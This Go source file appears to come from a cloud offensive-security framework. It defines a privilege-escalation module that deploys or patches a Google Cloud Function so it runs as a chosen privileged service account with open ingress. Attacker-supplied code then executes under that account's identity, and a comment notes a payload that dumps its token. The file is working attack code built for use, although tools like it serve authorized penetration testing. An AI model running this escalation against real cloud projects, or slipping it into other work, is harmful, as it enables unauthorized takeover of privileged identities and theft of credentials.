package functions

import (
	"context"
	"fmt"
	"strings"

	cloudfunctions "google.golang.org/api/cloudfunctions/v1"

	"github.com/user/nimbus/internal/module"
	"github.com/user/nimbus/internal/output"
)

func init() {
	module.Register(&EscalateDeploy{})
}

// EscalateDeploy creates or updates a Cloud Function to run as a privileged service account.
type EscalateDeploy struct{}

func (m *EscalateDeploy) Info() module.Info {
	return module.Info{
		Name:         "privesc.functions.escalate-deploy",
		Tactic:       module.TacticPrivesc,
		Service:      "cloudfunctions",
		Description:  "Deploy a Cloud Function as a privileged SA for code execution",
		RequiresAuth: true,
		AttackID:     "T1584.007",
	}
}

func (m *EscalateDeploy) Run(ctx module.RunContext) error {
	targetSA := ctx.Flags["target-sa"]
	functionName := ctx.Flags["function-name"]
	region := ctx.Flags["region"]
	sourceURL := ctx.Flags["source-url"]

	if targetSA == "" || functionName == "" {
		output.Warn("Usage: run privesc.functions.escalate-deploy --target-sa <email> --function-name <name> [--region <region>] [--source-url <gs://...>]")
		output.Info("Tip: run 'recon.iam.list-principals' to find privileged SAs.")
		output.Info("Tip: run 'recon.functions.scan-functions' to find existing functions to update.")
		return nil
	}

	if region == "" {
		region = "us-central1"
	}

	project := ""
	if len(ctx.Projects) > 0 {
		project = ctx.Projects[0]
	}
	if project == "" {
		output.Warn("No project specified.")
		return nil
	}

	svc, err := cloudfunctions.NewService(context.Background(), ctx.Session.ClientOption())
	if err != nil {
		return fmt.Errorf("create functions client: %w", err)
	}

	fullName := fmt.Sprintf("projects/%s/locations/%s/functions/%s", project, region, functionName)

	// Check if function already exists — update instead of create.
	existing, err := svc.Projects.Locations.Functions.Get(fullName).Do()
	if err == nil && existing != nil {
		return m.updateFunction(svc, existing, targetSA, sourceURL, ctx)
	}

	// Create new function.
	return m.createFunction(svc, project, region, functionName, targetSA, sourceURL, ctx)
}

func (m *EscalateDeploy) createFunction(svc *cloudfunctions.Service, project, region, name, targetSA, sourceURL string, ctx module.RunContext) error {
	parent := fmt.Sprintf("projects/%s/locations/%s", project, region)

	output.Info("Creating function %s as %s in %s/%s", name, targetSA, project, region)

	fn := &cloudfunctions.CloudFunction{
		Name:                parent + "/functions/" + name,
		Runtime:             "python310",
		EntryPoint:          "handler",
		ServiceAccountEmail: targetSA,
		HttpsTrigger:        &cloudfunctions.HttpsTrigger{},
		IngressSettings:     "ALLOW_ALL",
	}

	if sourceURL != "" {
		fn.SourceArchiveUrl = sourceURL
	} else {
		// Inline source — a simple function that dumps the SA token.
		fn.SourceArchiveUrl = ""
		output.Warn("No --source-url provided. You must provide a GCS URL to a zip containing your function code.")
		output.Info("Example: gs://my-bucket/function-source.zip")
		output.Info("The zip should contain main.py with a 'handler' function.")
		return nil
	}

	op, err := svc.Projects.Locations.Functions.Create(parent, fn).Do()
	if err != nil {
		return fmt.Errorf("create function: %w", err)
	}

	output.Success("Function creation initiated: %s", op.Name)
	output.Info("Function will run as: %s", targetSA)

	if ctx.Findings != nil {
		ctx.Findings <- module.Finding{
			Module:      "privesc.functions.escalate-deploy",
			Severity:    module.SevCritical,
			Title:       "Cloud Function deployed as privileged SA",
			Description: fmt.Sprintf("Created function %s running as %s in %s/%s", name, targetSA, project, region),
			Resource:    name,
			Project:     project,
			Data:        map[string]any{"target_sa": targetSA, "region": region},
		}
	}

	return nil
}

func (m *EscalateDeploy) updateFunction(svc *cloudfunctions.Service, existing *cloudfunctions.CloudFunction, targetSA, sourceURL string, ctx module.RunContext) error {
	output.Info("Updating existing function: %s", existing.Name)

	var updateMask []string

	if targetSA != "" && existing.ServiceAccountEmail != targetSA {
		existing.ServiceAccountEmail = targetSA
		updateMask = append(updateMask, "serviceAccountEmail")
		output.Info("Changing SA to: %s", targetSA)
	}

	if sourceURL != "" {
		existing.SourceArchiveUrl = sourceURL
		updateMask = append(updateMask, "sourceArchiveUrl")
		output.Info("Updating source to: %s", sourceURL)
	}

	if len(updateMask) == 0 {
		output.Info("Nothing to update.")
		return nil
	}

	op, err := svc.Projects.Locations.Functions.Patch(existing.Name, existing).
		UpdateMask(strings.Join(updateMask, ",")).Do()
	if err != nil {
		return fmt.Errorf("update function: %w", err)
	}

	output.Success("Function update initiated: %s", op.Name)

	if ctx.Findings != nil {
		ctx.Findings <- module.Finding{
			Module:      "privesc.functions.escalate-deploy",
			Severity:    module.SevCritical,
			Title:       "Cloud Function updated for privilege escalation",
			Description: fmt.Sprintf("Updated function %s to run as %s", existing.Name, targetSA),
			Resource:    existing.Name,
			Data:        map[string]any{"target_sa": targetSA, "updates": updateMask},
		}
	}

	return nil
}
